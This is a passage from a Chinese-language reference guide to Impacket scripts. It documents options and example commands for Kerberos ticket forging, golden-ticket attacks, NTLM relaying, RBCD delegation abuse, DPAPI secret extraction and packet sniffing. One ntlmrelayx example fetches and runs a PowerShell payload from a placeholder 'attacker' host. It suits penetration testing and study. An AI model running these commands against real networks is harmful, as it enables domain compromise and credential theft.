| `-debug`                           | 开启调试输出                                |
| `-u2u`                             | 请求用户到用户票据                          |
| `-self`                            | 仅执行 S4U2self，不执行 S4U2proxy           |
| `-force-forwardable`               | 强制通过 S4U2Self 获取的服务票据可转发      |
| `-renew`                           | 设置 RENEW 票据选项以续期用于身份验证的 TGT |

**认证参数**:

| 参数                    | 说明                                                             |
| ----------------------- | ---------------------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                                |
| `-no-pass`              | 不询问密码（对 -k 有用）                                         |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭证     |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）               |
| `-dc-ip ip address`     | 域控制器的 IP 地址，如果省略则使用目标参数中指定的域部分（FQDN） |

**示例**:

```python
python getST.py domain/username:password -spn "service/spn"
```

### ticketer.py

**功能**: 生成 Kerberos 票据
**用途**: 创建伪造的 Kerberos 票据

**参数说明**:

**位置参数**:

| 参数     | 说明               |
| -------- | ------------------ |
| `target` | 新创建票据的用户名 |

**选项参数**:

| 参数                       | 说明                                                          |
| -------------------------- | ------------------------------------------------------------- |
| `-h, --help`               | 显示帮助信息                                                  |
| `-spn SPN`                 | 目标服务的 SPN（service/server），如果省略则创建黄金票据      |
| `-request`                 | 向域请求票据并克隆，仅更改提供的信息，需要指定 -user          |
| `-domain DOMAIN`           | 完全限定域名（例如 contoso.com）                              |
| `-domain-sid DOMAIN_SID`   | 目标域的域 SID                                                |
| `-aesKey hex key`          | 用于签署票据的 AES 密钥（128 或 256 位）                      |
| `-nthash NTHASH`           | 用于签署票据的 NT 哈希                                        |
| `-keytab KEYTAB`           | 从 keytab 文件读取 SPN 的密钥（仅银票据）                     |
| `-groups GROUPS`           | 要包含在票据 PAC 中的组列表（默认 = 513, 512, 520, 518, 519） |
| `-user-id USER_ID`         | 创建票据的用户 ID（默认 = 500）                               |
| `-extra-sid EXTRA_SID`     | 要包含在票据 PAC 中的 ExtraSids 逗号分隔列表                  |
| `-extra-pac`               | 用额外的 PAC（UPN_DNS）填充票据                               |
| `-old-pac`                 | 使用旧的 PAC 结构创建票据                                     |
| `-duration DURATION`       | 票据过期前的小时数（默认 = 24*365*10）                        |
| `-ts`                      | 为每个日志输出添加时间戳                                      |
| `-debug`                   | 开启调试输出                                                  |
| `-impersonate IMPERSONATE` | Sapphire 票据，将被模拟的目标用户名                           |

**认证参数**:

| 参数                    | 说明                                                             |
| ----------------------- | ---------------------------------------------------------------- |
| `-user USER`            | 如果选择 -request，则使用的 domain/username                      |
| `-password PASSWORD`    | domain/username 的密码                                           |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                                |
| `-dc-ip ip address`     | 域控制器的 IP 地址，如果省略则使用目标参数中指定的域部分（FQDN） |

**示例**:

```python
python ticketer.py -nthash hash -domain-sid SID -domain domain.com user
python ticketer.py -aesKey hex_key -domain-sid SID -domain domain.com -spn cifs/server user
python ticketer.py -request -user domain/admin -password password -domain-sid SID -domain domain.com user
```

### goldenPac.py

**功能**: Golden Ticket 攻击工具
**用途**: 执行黄金票据攻击

**参数说明**:

**位置参数**:

| 参数      | 说明                                                                             |
| --------- | -------------------------------------------------------------------------------- |
| `target`  | 目标系统，格式为 `[[domain/]username[:password]@]<targetName>`                   |
| `command` | 在目标上执行的命令（或 -c 使用时的参数），默认为 cmd.exe，'None' 将不执行 PSEXEC |

**选项参数**:

| 参数                    | 说明                                            |
| ----------------------- | ----------------------------------------------- |
| `-h, --help`            | 显示帮助信息                                    |
| `-ts`                   | 为每个日志输出添加时间戳                        |
| `-debug`                | 开启调试输出                                    |
| `-c pathname`           | 上传文件名供以后执行，参数通过 command 选项传递 |
| `-w pathname`           | 将黄金票据以 CCache 格式写入 `<pathname>` 文件  |
| `-dc-ip ip address`     | 域控制器的 IP 地址（获取用户 SID 所需）         |
| `-target-ip ip address` | 要攻击的目标主机的 IP 地址                      |

**认证参数**:

| 参数                    | 说明                              |
| ----------------------- | --------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH |

**示例**:

```python
python goldenPac.py domain/user@target_ip -hashes hash
python goldenPac.py domain/user:password@target_ip -w ticket.ccache
python goldenPac.py domain/user@target_ip "whoami"
```

### ticketConverter.py

**功能**: 票据格式转换工具
**用途**: 转换不同格式的 Kerberos 票据

**参数说明**:

**位置参数**:

| 参数          | 说明                                  |
| ------------- | ------------------------------------- |
| `input_file`  | kirbi（KRB-CRED）或 ccache 格式的文件 |
| `output_file` | 输出文件                              |

**选项参数**:

| 参数         | 说明         |
| ------------ | ------------ |
| `-h, --help` | 显示帮助信息 |

**示例**:

```python
python ticketConverter.py ticket.kirbi ticket.ccache
python ticketConverter.py ticket.ccache ticket.kirbi
```

### describeTicket.py

**功能**: 描述票据内容
**用途**: 分析 Kerberos 票据的详细信息

**参数说明**:

**位置参数**:

| 参数     | 说明                   |
| -------- | ---------------------- |
| `ticket` | ticket.ccache 文件路径 |

**选项参数**:

| 参数         | 说明                     |
| ------------ | ------------------------ |
| `-h, --help` | 显示帮助信息             |
| `-debug`     | 开启调试输出             |
| `-ts`        | 为每个日志输出添加时间戳 |

**票据解密凭证**:

| 参数                                          | 说明                   |
| --------------------------------------------- | ---------------------- |
| `-p PASSWORD, --password PASSWORD`            | 服务账户的明文密码     |
| `-hp HEXPASSWORD, --hex-password HEXPASSWORD` | 服务账户的十六进制密码 |
| `-u USER, --user USER`                        | 服务账户的名称         |
| `-d DOMAIN, --domain DOMAIN`                  | FQDN 域名              |
| `-s SALT, --salt SALT`                        | 密钥计算的盐值         |
| `--rc4 RC4`                                   | RC4 密钥（即 NT 哈希） |
| `--aes HEXKEY`                                | AES128 或 AES256 密钥  |

**PAC 凭证解密材料**:

| 参数                 | 说明                       |
| -------------------- | -------------------------- |
| `--asrep-key HEXKEY` | PAC 凭证解密的 AS 回复密钥 |

**示例**:

```python
python describeTicket.py ticket.kirbi
python describeTicket.py ticket.ccache -p password -u service_account -d domain.com
python describeTicket.py ticket.kirbi --rc4 nthash
```

### getPac.py

**功能**: 获取 PAC（Privilege Attribute Certificate）
**用途**: 提取 PAC 信息

**参数说明**:

**位置参数**:

| 参数          | 说明                                        |
| ------------- | ------------------------------------------- |
| `credentials` | 域凭据，格式为 `domain/username[:password]` |

**选项参数**:

| 参数                     | 说明                     |
| ------------------------ | ------------------------ |
| `-h, --help`             | 显示帮助信息             |
| `-targetUser TARGETUSER` | 要检索 PAC 的目标用户    |
| `-debug`                 | 开启调试输出             |
| `-ts`                    | 为每个日志输出添加时间戳 |

**认证参数**:

| 参数                    | 说明                              |
| ----------------------- | --------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH |

**示例**:

```python
python getPac.py domain/username:password -targetUser Administrator
python getPac.py domain/username -targetUser Administrator -hashes :nthash
```

### kintercept.py

**功能**: Kerberos 拦截工具
**用途**: 拦截和分析 Kerberos 流量

**参数说明**:

**位置参数**:

| 参数     | 说明           |
| -------- | -------------- |
| `server` | 目标服务器地址 |

**选项参数**:

| 参数                            | 说明                                |
| ------------------------------- | ----------------------------------- |
| `-h, --help`                    | 显示帮助信息                        |
| `--server-port SERVER_PORT`     | 目标服务器端口                      |
| `--listen-port LISTEN_PORT`     | 监听端口                            |
| `--listen-addr LISTEN_ADDR`     | 监听地址                            |
| `--request-handler HANDLER:ARG` | 请求处理器，示例：s4u2else:user     |
| `--reply-handler HANDLER:ARG`   | 回复处理器，示例：tgs-rep-user:user |
| `-ts`                           | 为每个日志输出添加时间戳            |
| `-debug`                        | 开启调试输出                        |

**示例**:

```python
python kintercept.py 192.168.1.100
python kintercept.py 192.168.1.100 --listen-port 8888 --request-handler s4u2else:Administrator
python kintercept.py 192.168.1.100 --server-port 88 --listen-addr 0.0.0.0
```

## 网络攻击工具

### ntlmrelayx.py

**功能**: NTLM 中继攻击工具
**用途**: 执行 NTLM 身份验证中继攻击

**参数说明**:

**目标参数**:

| 参数                                       | 说明                                                                        |
| ------------------------------------------ | --------------------------------------------------------------------------- |
| `-t TARGET, --target TARGET`               | 中继目标，格式为 `[scheme://]target[:port]`，例如 `smb://192.168.1.100:445` |
| `-tf TARGETFILE, --target-file TARGETFILE` | 包含目标列表的文件                                                          |

**选项参数**:

| 参数                                               | 说明                                                        |
| -------------------------------------------------- | ----------------------------------------------------------- |
| `-h, --help`                                       | 显示帮助信息                                                |
| `-smb-port SMB_PORT`                               | SMB 服务器端口（默认：445）                                 |
| `-http-port HTTP_PORT`                             | HTTP 服务器端口（默认：80）                                 |
| `-socks-port SOCKS_PORT`                           | SOCKS 代理端口（默认：1080）                                |
| `-socks-address SOCKS_ADDRESS`                     | SOCKS 代理地址（默认：0.0.0.0）                             |
| `-l LOOTDIR, --lootdir LOOTDIR`                    | 存放收集到的信息的目录（默认：当前目录）                    |
| `-of OUTPUT_FILE, --output-file OUTPUT_FILE`       | 加密哈希的输出文件名                                        |
| `-dh, --dump-hashes`                               | 在控制台显示加密哈希                                        |
| `-codec CODEC`                                     | 设置目标输出使用的编码（默认：ascii）                       |
| `-smb2support`                                     | SMB2 支持                                                   |
| `-ntlmchallenge NTLMCHALLENGE`                     | 指定 SMB 服务器使用的 NTLM 挑战（16 个十六进制字节）        |
| `-socks`                                           | 启动 SOCKS 代理用于中继连接                                 |
| `-wh WPAD_HOST, --wpad-host WPAD_HOST`             | 启用 WPAD 文件服务用于代理身份验证攻击                      |
| `-wa WPAD_AUTH_NUM, --wpad-auth-num WPAD_AUTH_NUM` | 在提供 WPAD 文件之前提示客户端进行身份验证的次数（默认：1） |
| `-6, --ipv6`                                       | 在 IPv6 上监听                                              |
| `--remove-mic`                                     | 移除 MIC（利用 CVE-2019-1040）                              |
| `--serve-image SERVE_IMAGE`                        | 将返回给客户端的图像的本地路径                              |
| `-c COMMAND`                                       | 在目标系统上执行的命令（适用于 SMB 和 RPC）                 |

**服务器选项**:

| 参数                | 说明              |
| ------------------- | ----------------- |
| `--no-smb-server`   | 禁用 SMB 服务器   |
| `--no-http-server`  | 禁用 HTTP 服务器  |
| `--no-wcf-server`   | 禁用 WCF 服务器   |
| `--no-raw-server`   | 禁用 RAW 服务器   |
| `--no-rpc-server`   | 禁用 RPC 服务器   |
| `--no-winrm-server` | 禁用 WinRM 服务器 |

**SMB 客户端选项**:

| 参数                            | 说明                                                                                     |
| ------------------------------- | ---------------------------------------------------------------------------------------- |
| `-e FILE`                       | 在目标系统上执行的文件                                                                   |
| `--enum-local-admins`           | 如果中继用户不是管理员，尝试 SAMR 查找查看谁是管理员（仅适用于 Win 10 Anniversary 之前） |
| `--rpc-attack {None,TSCH,ICPR}` | 选择通过命名管道上的 RPC 执行的攻击                                                      |

**RPC 客户端选项**:

| 参数                                     | 说明                                        |
| ---------------------------------------- | ------------------------------------------- |
| `-rpc-mode {TSCH,ICPR}`                  | 要攻击的协议                                |
| `-rpc-use-smb`                           | 将 DCE/RPC 中继到 SMB 管道                  |
| `-auth-smb [domain/]username[:password]` | 使用此凭据对 SMB 进行身份验证（低权限账户） |
| `-hashes-smb LMHASH:NTHASH`              | SMB 的 NTLM 哈希                            |
| `-rpc-smb-port {139,445}`                | 连接到 SMB 的目标端口                       |
| `-icpr-ca-name ICPR_CA_NAME`             | ICPR 攻击的 CA 名称                         |

**MSSQL 客户端选项**:

| 参数                      | 说明                                |
| ------------------------- | ----------------------------------- |
| `-q QUERY, --query QUERY` | 要执行的 MSSQL 查询（可以指定多个） |

**HTTP 选项**:

| 参数                               | 说明                                                      |
| ---------------------------------- | --------------------------------------------------------- |
| `-machine-account MACHINE_ACCOUNT` | 与域交互时使用的域计算机账户，格式为 domain/machine_name  |
| `-machine-hashes LMHASH:NTHASH`    | 域计算机哈希                                              |
| `-domain DOMAIN`                   | 使用 NETLOGON 连接的域 FQDN 或 IP                         |
| `-remove-target`                   | 尝试在挑战消息中移除目标（如果未安装 CVE-2019-1019 补丁） |

**LDAP 客户端选项**:

| 参数                            | 说明                                                    |
| ------------------------------- | ------------------------------------------------------- |
| `--no-dump`                     | 不尝试转储 LDAP 信息                                    |
| `--no-da`                       | 不尝试添加域管理员                                      |
| `--no-acl`                      | 禁用 ACL 攻击                                           |
| `--no-validate-privs`           | 不尝试枚举权限，假设权限被授予通过 ACL 攻击提升用户权限 |
| `--escalate-user ESCALATE_USER` | 提升此用户的权限而不是创建新用户                        |
| `--delegate-access`             | 将中继计算机账户的访问权限委托给指定账户                |
| `--sid`                         | 使用 SID 而不是账户名称来委托访问权限                   |
| `--dump-laps`                   | 尝试转储用户可读的 LAPS 密码                            |
| `--dump-gmsa`                   | 尝试转储用户可读的 gMSA 密码                            |
| `--dump-adcs`                   | 尝试转储 ADCS 注册服务和证书模板信息                    |
| `--add-dns-record NAME IPADDR`  | 通过 LDAP 将 <NAME> 记录添加到 DNS，指向 <IPADDR>       |

**SMB 和 LDAP 的通用选项**:

| 参数                                           | 说明                                    |
| ---------------------------------------------- | --------------------------------------- |
| `--add-computer [COMPUTERNAME [PASSWORD ...]]` | 尝试通过 SMB 或 LDAP 添加新的计算机账户 |

**IMAP 客户端选项**:

| 参数                                | 说明                                                           |
| ----------------------------------- | -------------------------------------------------------------- |
| `-k KEYWORD, --keyword KEYWORD`     | 要搜索的 IMAP 关键字，如果未指定，将搜索包含 "password" 的邮件 |
| `-m MAILBOX, --mailbox MAILBOX`     | 要转储的邮箱名称，默认：INBOX                                  |
| `-a, --all`                         | 不搜索关键字，转储所有邮件                                     |
| `-im IMAP_MAX, --imap-max IMAP_MAX` | 要转储的最大邮件数（0 = 无限制，默认：无限制）                 |

**AD CS 攻击选项**:

| 参数                  | 说明                                                                    |
| --------------------- | ----------------------------------------------------------------------- |
| `--adcs`              | 启用 AD CS 中继攻击                                                     |
| `--template TEMPLATE` | AD CS 模板，默认为 Machine 或 User（取决于中继账户名称是否以 `$` 结尾） |
| `--altname ALTNAME`   | 执行 ESC1 或 ESC6 攻击时使用的使用者备用名称                            |

**Shadow Credentials 攻击选项**:

| 参数                                    | 说明                                           |
| --------------------------------------- | ---------------------------------------------- |
| `--shadow-credentials`                  | 启用 Shadow Credentials 中继攻击               |
| `--shadow-target SHADOW_TARGET`         | 要填充 msDS-KeyCredentialLink 的目标账户       |
| `--pfx-password PFX_PASSWORD`           | 存储的自签名证书的 PFX 密码                    |
| `--export-type {PEM,PFX}`               | 选择导出证书+私钥的格式（默认：PFX）           |
| `--cert-outfile-path CERT_OUTFILE_PATH` | 存储生成的自签名 PEM 或 PFX 证书和密钥的文件名 |

**SCCM 策略攻击选项**:

| 参数                                                  | 说明                                                       |
| ----------------------------------------------------- | ---------------------------------------------------------- |
| `--sccm-policies`                                     | 启用 SCCM 策略攻击，通过注册设备从管理点转储 SCCM 秘密策略 |
| `--sccm-policies-clientname SCCM_POLICIES_CLIENTNAME` | 注册以转储秘密策略的客户端名称                             |
| `--sccm-policies-sleep SCCM_POLICIES_SLEEP`           | 客户端注册后请求秘密策略前等待的秒数                       |

**SCCM 分发点攻击选项**:

| 参数                                      | 说明                                               |
| ----------------------------------------- | -------------------------------------------------- |
| `--sccm-dp`                               | 启用 SCCM 分发点攻击，从 SCCM 分发点执行包文件转储 |
| `--sccm-dp-extensions SCCM_DP_EXTENSIONS` | 从分发点下载文件时查找的自定义扩展名列表           |
| `--sccm-dp-files SCCM_DP_FILES`           | 包含要从分发点下载的特定 URL 列表的文件路径        |

**示例**:

```python
python ntlmrelayx.py -t smb://192.168.1.100 -c "whoami"
python ntlmrelayx.py -t ldap://dc01 -c "net user"
python ntlmrelayx.py -t smb://192.168.1.100 -e payload.exe
python ntlmrelayx.py -t http://webserver -c "powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

### karmaSMB.py

**功能**: Karma SMB 攻击工具
**用途**: 执行 SMB 中间人攻击

**参数说明**:

**位置参数**:

| 参数       | 说明                              |
| ---------- | --------------------------------- |
| `pathname` | 要传递给 SMB 客户端的文件内容路径 |

**选项参数**:

| 参数               | 说明                                       |
| ------------------ | ------------------------------------------ |
| `--help`           | 显示帮助信息                               |
| `-config pathname` | 配置文件名，用于将扩展名映射到要传递的文件 |
| `-smb2support`     | SMB2 支持（实验性）                        |
| `-ts`              | 为每个日志输出添加时间戳                   |
| `-debug`           | 开启调试输出                               |

**示例**:

```python
python karmaSMB.py payload.dll
python karmaSMB.py -config config.txt payload.exe
python karmaSMB.py -smb2support -debug payload.dll
```

### keylistattack.py

**功能**: 密钥列表攻击工具
**用途**: 执行 KERB-KEY-LIST-REQ 攻击，从远程机器转储秘密

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                                                                                      |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `target` | `[[domain/]username[:password]@]<KDC HostName or IP address>`（使用此凭据对 SMB 进行身份验证并列出域用户）或 `LIST`（如果要解析目标文件） |

**选项参数**:

| 参数               | 说明                                                      |
| ------------------ | --------------------------------------------------------- |
| `-h, --help`       | 显示帮助信息                                              |
| `-rodcNo RODCNO`   | RODC krbtgt 账户的编号                                    |
| `-rodcKey RODCKEY` | 只读域控制器的 AES 密钥                                   |
| `-full`            | 对所有域用户运行攻击，噪音大！可能导致更多 TGS 请求被拒绝 |
| `-debug`           | 开启调试输出                                              |
| `-ts`              | 为每个日志输出添加时间戳                                  |

**LIST 选项**:

| 参数             | 说明                                      |
| ---------------- | ----------------------------------------- |
| `-domain DOMAIN` | 完全限定域名（仅适用于 LIST）             |
| `-t T`           | 仅攻击指定的用户名（仅适用于 LIST）       |
| `-tf TF`         | 包含目标用户名列表的文件（仅适用于 LIST） |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | 使用 NTLM 哈希对 SMB 进行身份验证并列出域用户      |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 对 SMB 进行身份验证并列出域用户      |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                    | 说明               |
| ----------------------- | ------------------ |
| `-dc-ip ip address`     | 域控制器的 IP 地址 |
| `-target-ip ip address` | 目标机器的 IP 地址 |

**示例**:

```python
python keylistattack.py domain/username:password@dc01 -rodcNo 20000 -rodcKey aes_key
python keylistattack.py domain/username@dc01 -rodcNo 20000 -rodcKey aes_key -full
python keylistattack.py -kdc dc01 -t victim -rodcNo 20000 -rodcKey aes_key LIST
python keylistattack.py -kdc dc01 -domain domain.com -tf targetfile.txt -rodcNo 20000 -rodcKey aes_key LIST
```

### badsuccessor.py

**功能**: Bad Successor 攻击工具
**用途**: 执行 Bad Successor 攻击
**示例**:

```python
python badsuccessor.py domain/username:password@dc_ip
```

### rbcd.py

**功能**: Resource-Based Constrained Delegation 攻击
**用途**: 用于处理目标计算机的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的 Python 脚本

**参数说明**:

**位置参数**:

| 参数       | 说明                                              |
| ---------- | ------------------------------------------------- |
| `identity` | 域身份，格式为 `domain.local/username[:password]` |

**选项参数**:

| 参数                                  | 说明                                                                              |
| ------------------------------------- | --------------------------------------------------------------------------------- |
| `-delegate-to DELEGATE_TO`            | 要读取/编辑等的目标账户                                                           |
| `-delegate-from DELEGATE_FROM`        | 要写入到 -delegate-to 的 rbcd 属性的攻击者控制账户（仅在使用 `-action write` 时） |
| `-action [{read,write,remove,flush}]` | 对 msDS-AllowedToActOnBehalfOfOtherIdentity 执行的操作（默认：read）              |
| `-use-ldaps`                          | 使用 LDAPS 而不是 LDAP                                                            |
| `-ts`                                 | 为每个日志输出添加时间戳                                                          |
| `-debug`                              | 开启调试输出                                                                      |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                | 说明               |
| ------------------- | ------------------ |
| `-dc-ip ip address` | 域控制器的 IP 地址 |
| `-dc-host hostname` | 域控制器的主机名   |

**示例**:

```python
python rbcd.py domain/username:password -delegate-to target_computer$ -action read
python rbcd.py domain/username:password -delegate-to target_computer$ -delegate-from attacker_computer$ -action write
python rbcd.py domain/username:password -delegate-to target_computer$ -delegate-from attacker_computer$ -action remove
python rbcd.py -use-ldaps domain/username:password -delegate-to target_computer$ -action flush
```

## 系统分析工具

### dpapi.py

**功能**: DPAPI 数据保护 API 工具
**用途**: 处理 DPAPI 保护的数据

**参数说明**:

**位置参数**:

| 参数         | 说明                         |
| ------------ | ---------------------------- |
| `backupkeys` | 域备份密钥相关功能           |
| `masterkey`  | 主密钥相关功能               |
| `credential` | 凭据相关功能                 |
| `vault`      | 保险库凭据相关功能           |
| `unprotect`  | 提供 CryptUnprotectData 功能 |
| `credhist`   | CREDHIST 相关功能            |

**选项参数**:

| 参数         | 说明                     |
| ------------ | ------------------------ |
| `-h, --help` | 显示帮助信息             |
| `-debug`     | 开启调试输出             |
| `-ts`        | 为每个日志输出添加时间戳 |

**backupkeys 子命令**:

| 参数                         | 说明                                                     |
| ---------------------------- | -------------------------------------------------------- |
| `-t TARGET, --target TARGET` | `[[domain/]username[:password]@]<targetName or address>` |
| `-hashes LMHASH:NTHASH`      | NTLM 哈希值，格式为 LMHASH:NTHASH                        |
| `-no-pass`                   | 不询问密码（对 -k 有用）                                 |
| `-k`                         | 使用 Kerberos 身份验证                                   |
| `-aesKey hex key`            | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）       |
| `-dc-ip ip address`          | 域控制器的 IP 地址                                       |
| `--export`                   | 将密钥导出到文件                                         |

**masterkey 子命令**:

| 参数                         | 说明                       |
| ---------------------------- | -------------------------- |
| `-file FILE`                 | 要解析的主密钥文件         |
| `-sid SID`                   | 用户的 SID                 |
| `-pvk PVK`                   | 用于解密的域备份私钥       |
| `-key KEY`                   | 用于解密的特定密钥         |
| `-password PASSWORD`         | 用户的密码                 |
| `-system SYSTEM`             | 要解析的 SYSTEM 配置单元   |
| `-security SECURITY`         | 要解析的 SECURITY 配置单元 |
| `-t TARGET, --target TARGET` | 主密钥所有者的凭据         |
| `-hashes LMHASH:NTHASH`      | NTLM 哈希值                |
| `-no-pass`                   | 不询问密码                 |
| `-k`                         | 使用 Kerberos 身份验证     |
| `-aesKey hex key`            | AES 密钥                   |
| `-dc-ip ip address`          | 域控制器的 IP 地址         |

**credential 子命令**:

| 参数         | 说明           |
| ------------ | -------------- |
| `-file FILE` | 凭据文件       |
| `-key KEY`   | 用于解密的密钥 |

**vault 子命令**:

| 参数         | 说明             |
| ------------ | ---------------- |
| `-vcrd VCRD` | 保险库凭据文件   |
| `-vpol VPOL` | 保险库策略文件   |
| `-key KEY`   | 用于解密的主密钥 |

**unprotect 子命令**:

| 参数                         | 说明                          |
| ---------------------------- | ----------------------------- |
| `-file FILE`                 | 包含要解密的 DATA_BLOB 的文件 |
| `-key KEY`                   | 用于解密的密钥                |
| `-entropy ENTROPY`           | 解密所需的额外熵字符串        |
| `-entropy-file ENTROPY_FILE` | 包含二进制熵内容的文件        |

**credhist 子命令**:

| 参数                 | 说明                  |
| -------------------- | --------------------- |
| `-file FILE`         | CREDHIST 文件         |
| `-key KEY`           | 用于解密的特定密钥    |
| `-password PASSWORD` | 用户的密码            |
| `-entry ENTRY`       | CREDHIST 中的条目索引 |

**示例**:

```python
# 导出域备份密钥
python dpapi.py backupkeys -t domain/username:password@dc01 --export

# 解析主密钥
python dpapi.py masterkey -file masterkey.bin -sid S-1-5-21-123456789-1234567890-1234567890-1001 -password userpassword

# 解析凭据文件
python dpapi.py credential -file credential.bin -key 0x1234567890abcdef1234567890abcdef

# 解析保险库
python dpapi.py vault -vcrd vault.vcrd -vpol vault.vpol -key masterkey.bin

# 解密 DATA_BLOB
python dpapi.py unprotect -file blob.bin -key 0x1234567890abcdef1234567890abcdef

# 解析 CREDHIST 文件
python dpapi.py credhist -file credhist.bin -password userpassword
```

### getArch.py

**功能**: 获取目标系统架构
**用途**: 获取目标系统的操作系统架构版本

**参数说明**:

**选项参数**:

| 参数               | 说明                                           |
| ------------------ | ---------------------------------------------- |
| `-target TARGET`   | 目标名称或地址                                 |
| `-targets TARGETS` | 包含要查询架构的目标系统的输入文件（每行一个） |
| `-timeout TIMEOUT` | 连接目标时的套接字超时时间（默认 2 秒）        |
| `-debug`           | 开启调试输出                                   |
| `-ts`              | 为每个日志输出添加时间戳                       |

**示例**:

```python
python getArch.py -target target_ip
python getArch.py -targets targets.txt
python getArch.py -target target_ip -timeout 5
```

### filetime.py

**功能**: 文件时间戳工具
**用途**: 处理 Windows 文件时间戳
**示例**:

```python
python filetime.py timestamp
```

### mqtt_check.py

**功能**: MQTT 服务检查工具
**用途**: 检测 MQTT 服务
**示例**:

```python
python mqtt_check.py target_ip
```

### exchanger.py

**功能**: Exchange 服务器工具
**用途**: 滥用 Exchange 服务的工具

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `{nspi}` | 模块名称                                                                  |
|          | `nspi`: 攻击 NSPI 接口                                                    |

**选项参数**:

| 参数                         | 说明                                          |
| ---------------------------- | --------------------------------------------- |
| `-debug`                     | 开启调试和扩展输出                            |
| `-ts`                        | 为每个日志输出添加时间戳                      |
| `-rpc-hostname RPC_HOSTNAME` | 服务器的 GUID 名称（首选）或 NetBIOS 名称格式 |

**认证参数**:

| 参数                    | 说明                              |
| ----------------------- | --------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH |

**示例**:

```python
python exchanger.py domain/username:password@exchange_ip nspi
python exchanger.py -debug domain/username:password@exchange_ip nspi
```

### sambaPipe.py

**功能**: Samba 管道工具
**用途**: Samba 管道漏洞利用

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数     | 说明                      |
| -------- | ------------------------- |
| `-so SO` | 要上传和加载的 .so 文件名 |
| `-debug` | 开启调试输出              |
| `-ts`    | 为每个日志输出添加时间戳  |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python sambaPipe.py -so exploit.so domain/username:password@target_ip
python sambaPipe.py -so exploit.so -debug domain/username:password@target_ip
```

## 监控和嗅探工具

### sniff.py

**功能**: 网络嗅探工具
**用途**: 捕获和分析网络流量

**注意事项**:

- **依赖要求**: 需要安装 `pcapy` 模块
- **权限要求**: 需要管理员权限才能打开原始套接字

**参数说明**:

该脚本接受 BPF (Berkeley Packet Filter) 过滤器作为参数，默认为空（匹配所有数据包）。

**位置参数**:

| 参数       | 说明                                           |
| ---------- | ---------------------------------------------- |
| `[filter]` | BPF 过滤器表达式（可选），用于过滤捕获的数据包 |

**使用前需要先安装依赖**:

```bash
pip install pcapy
```

**示例**:

```python
# 捕获所有数据包
python sniff.py

# 只捕获 TCP 流量
python sniff.py tcp

# 只捕获特定端口的流量
python sniff.py "tcp port 80"

# 只捕获特定主机的流量
python sniff.py "host 192.168.1.100"

# 组合过滤器
python sniff.py "tcp port 80 and host 192.168.1.100"
```

### sniffer.py

**功能**: 网络数据包嗅探工具
**用途**: 使用原始套接字监听指定协议的网络数据包

**注意事项**:

- **权限要求**: 需要管理员权限才能创建原始套接字
- **平台限制**: 在 Windows 上需要以管理员身份运行

**参数说明**:

**位置参数**:

| 参数                          | 说明                                                  |
| ----------------------------- | ----------------------------------------------------- |
| `[protocol1] [protocol2] ...` | 要监听的协议名称（可选），默认为 `icmp`, `tcp`, `udp` |

**支持的协议**:

| 参数   | 说明                   |
| ------ | ---------------------- |
| `icmp` | ICMP 协议              |
| `tcp`  | TCP 协议               |
| `udp`  | UDP 协议               |
| 其他   | 系统支持的其他协议名称 |

**示例**:

```python
# 使用默认协议 (icmp, tcp, udp)
python sniffer.py

# 只监听 ICMP 流量
python sniffer.py icmp

# 监听 TCP 和 UDP 流量
python sniffer.py tcp udp

# 监听多种协议
python sniffer.py icmp tcp udp
```

### ping.py

**功能**: 网络连通性测试
**用途**: 测试网络连通性

**权限要求**:

- 需要管理员权限才能打开原始套接字

**参数说明**:
该脚本没有使用参数解析器，直接接受两个位置参数：

**位置参数**:

| 参数       | 说明         |
| ---------- | ------------ |
| `<src ip>` | 源 IP 地址   |
| `<dst ip>` | 目标 IP 地址 |

**示例**:

```python
python ping.py 192.168.1.100 192.168.1.200
```

### ping6.py

**功能**: IPv6 网络连通性测试
**用途**: 测试 IPv6 网络连通性

**参数说明**:

**位置参数**:

| 参数       | 说明           |
| ---------- | -------------- |
| `<src ip>` | 源 IPv6 地址   |
